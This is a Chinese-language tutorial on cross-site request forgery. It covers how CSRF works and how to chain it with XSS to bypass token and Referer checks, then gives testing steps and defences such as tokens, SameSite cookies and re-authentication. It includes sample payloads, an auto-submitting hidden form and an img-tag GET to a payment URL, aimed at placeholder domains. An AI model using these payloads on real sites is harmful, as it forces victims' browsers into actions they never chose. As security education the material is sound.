### 简介

跨站请求伪造Cross-Site Request Forgery(CSRF)，也被称为one click attack/session riding

### 原理

"借刀杀人"

CSRF通过构造get/post等请求，设法使已登录用户victim不知情的情况下，设法让victim携带自身Cookie发出"非其主观意愿的"HTTP请求

* CSRF局限性:如果只有单一的CSRF漏洞，攻击者无法得到该HTTP请求的内容(Cookie可用但无法查看)，也无法得到任何回显(HTTP响应等)
* CSRF扩展性:可联合其他漏洞(如XSS)进行攻击效果最大化

### CSRF类型

* CSRF类型 按method分
  * GET - 利用方式 使victim点击构造的url 发出GET请求 `http://get.csrfvul.com/payto?name=hacker&moneynumb=100`
  * POST - 利用方式 尝试转变为GET (可尝试将post请求体改成get形式放至url参数中 如果可以正常响应 则可以使用GET请求进行csrf攻击)

### 利用CSRF实现攻击

* 漏洞联合 - 使用XSS可绕过CSRF保护机制 无交互地利用CSRF漏洞 有以下场景:
   * 1.利用自身域名的XSS漏洞绕过CSRF防御机制 - 很多anti-CSRF机制原理是判断HTTP请求中的CSRFtoken的值，当只存在XSS漏洞时，可使用JavaScript找到csrf-token参数值(需要看csrf-token的具体位置)，并构造出携带csrf-toekn的HTTP请求 可通过后端对csrf-token的验证 实现CSRF攻击
   * 2.利用自身/兄弟/父子域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
   * 如果有html注入漏洞 也是同理

|csrf-token位置|获取方法|描述|
|:---:|---|-------|
|html代码form表单|略||
|cookie|略|注意如果是HTTP-only的cookie就难以获取|


* 漏洞联合 - CSRF漏洞 可使self-XSS漏洞"变废为宝"
  * 场景 - `vul.com`存在self-XSS漏洞和CSRF漏洞，而直接利用self-XSS漏洞则victim只能是自己，如何实现self-XSS去攻击自己以外的目标?
  * 目标 - 通过借助CSRF漏洞，使XSSpayload能够攻击自己以外的目标
  * 过程 - 可在攻击者可控的第三方网站`https://3.com`下利用`vul.com`的CSRF漏洞:通过多种方法(如JavaScript)都可以构造出跨域HTTP请求发送到`vul.com`，其中RequestBody的内容包含了"能够触发self-XSS漏洞的payload"，所以当victim访问第三方网站`https://3.com`时，会发出CSRF请求到`vul.com`，则该用户在`vul.com`域下被XSS攻击


#### 利用CSRF漏洞发出GET请求

* 场景
  * 攻击者可控的第三方域:`www.3.com`会被victim访问
  * 目标域存在CSRF漏洞

通过多种办法(如JavaScript) 在 `http://www.3.com/demo` 中注入代码:
```
<img src="http://get.csrfvul.com/payto?name=hacker&moneynumb=100">
```

victim访问`http://www.3.com/demo` 则会发出GET请求到`get.csrfvul.com`


`get.csrfvul.com`收到了这个GET请求:

很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
```
GET /payto?name=hacker&moneynumb=100 HTTP/1.1
Host: get.csrfvul.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://www.3.com/demo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```

#### 利用可控的第三方域 实现CSRF发出POST请求

* 场景
  * 攻击者可控的第三方域:`www.3.com`会被victim访问
  * 目标域存在CSRF漏洞

通过多种办法(如JavaScript或HTML注入) 在 `https://www.3.com/demo` 中注入html代码:

```
<iframe style="display:none" name="csrf-frame1"></iframe>
<form method='POST' action='https://post.csrfvul.com/search' target="csrf-frame1" id="csrf-form">
      <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
      <input type="hidden" name="offset" value="0" />
      <input type="hidden" name="limit" value="20" />
      <input type="submit" value="send Request" /><!--实战中去掉这一行 不会影响POST请求的发送 可以隐藏按钮-->
    </form>
<script>document.getElementById("csrf-form").submit()</script>
```

victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.csrfvul.com`

`post.csrfvul.com`收到了这个POST请求:
```
POST /search HTTP/1.1
Host: post.csrfvul.com
Connection: keep-alive
Content-Length: 28
Cache-Control: max-age=0
Origin: https://3.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://3.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

ip=1.1.1.1&offset=0&limit=20
```

很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
```
Origin: https://3.com
Referer: https://3.com/
```


### 漏洞影响

* CSRF攻击场景 利用victim的身份进行操作
  * 修改管理员密码 - 使管理员点击构造的链接 即可修改其密码
  * 新建管理员账号 - 使管理员点击构造的链接 即可新增管理员
  * 社交站点蠕虫(XSS结合CSRF) - 如果"向好友发送消息"的HTTP请求中没有设置CSRF-token请求头 则可结合XSS可构造出XSS+CSRF蠕虫 影响极大
  * 拒绝服务(XSS结合CSRF) - 如果XSS能打到管理员后台 且管理员注销动作无CSRF防御机制 则可构造payload使管理员一登录就注销

### 测试

* 相同请求重放 - 即可判断token是否为每次动态生成 仅一次性有效 用后失效
* 完全删除CSRFtoken值令其为空 - 即可判断后端是否验证token是否有效
* 修改CSRFtoken值中一个字符 - 即可判断后端验证机制是否严谨
* HTTP方法由POST转换为GET - 即可判断后端验证机制是否严谨

### SDL - 防御与修复方案

* web框架 - 启动框架中成熟的CSRF防御功能
  * 自定义HTTP请求头(Custom Request Headers)
    * 如使用`X-CSRF-token:xxxx`标明CSRF_TOKEN的值(即使CSRF利用成功发出了携带Cookie的HTTP请求 但后端判断`X-CSRF-token`不存在则拒绝请求)
  * One-time Token
    * 如每次提交表单都包含字段`Token=xxxx`且每次值不同 后端可校验是否正确
* `Set-Cookie`使用`SameSite`属性
  * 后端Response Header`Set-Cookie`中设置`SameSite`属性(由Google引入浏览器 用于缓解CSRF攻击)，`SameSite`属性有3种值:
    * `Strict`严格
      * 例如 域b.com的Response Header有`Set-Cookie: admin_cookie_strict=xxx; SameSite=Strict`，浏览器中会保存这一Cookie字段`admin_cookie_strict=xxx`，但由于`SameSite=Strict`为**严格**，所以浏览器对(非b.com域下发起的)访问b.com的**任何跨域请求**都不允许携带这一Cookie字段`admin_cookie=xxx`，所以可以防御CSRF攻击。比如从域a.com下构造并发出跨域请求访问b.com(尝试CSRF)，绝对不会携带关键的cookie，从而b.com后端鉴权失败，CSRF攻击失败
    * `Lax`宽松 - 没有`SameSite`属性的cookie被浏览器默认为`SameSite=Lax`
      * 例如 域b.com的Response Header有`Set-Cookie: admin_cookie_lax=xxx; SameSite=Lax`，浏览器中会保存这一Cookie字段`admin_cookie_lax=xxx`，但由于`SameSite=Strict`为**宽松**，所以浏览器对(非b.com域下发起的)访问b.com的**多种跨域请求**都不允许携带这一Cookie字段，只有以下3种方式(任何一种)，才能够携带b.com的cookie`admin_cookie_lax=xxx`
        * 非同域下的a标签 `<a href="http://b.com"></a>`
        * 非同域下的GET表单 `<form method="GET" action="http://b.com/formdemo">`
        * 非同域下的link标签 `<link rel="prerender" href="http://b.com"/>`
    * `None`无
      * `SameSite=None`必须同时指定`Secure`，例如`Set-Cookie: session_none=abc123; SameSite=None; Secure`
* 二次验证 - 安全但影响用户体验(适用于仅对敏感功能处进行防御)
  * CAPTCHA 增加验证码机制
  * 再次输入密码
  * 手机验证码
* (不推荐)通过`Referer/Origin`校验来源域名
  * 缺陷1.只能防御从"不被信任"的域发起的伪造的http请求（如果 **父、子、兄弟域名** 或 **CORS中被信任的域名** 有XSS漏洞 配合构造一个伪造请求 此时referer和Origin的值都是被信任的域 此时“校验来源域名”无法防御）
  * 缺陷2.正常业务如果有302跳转 不携带Origin

参考OWASP [Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)
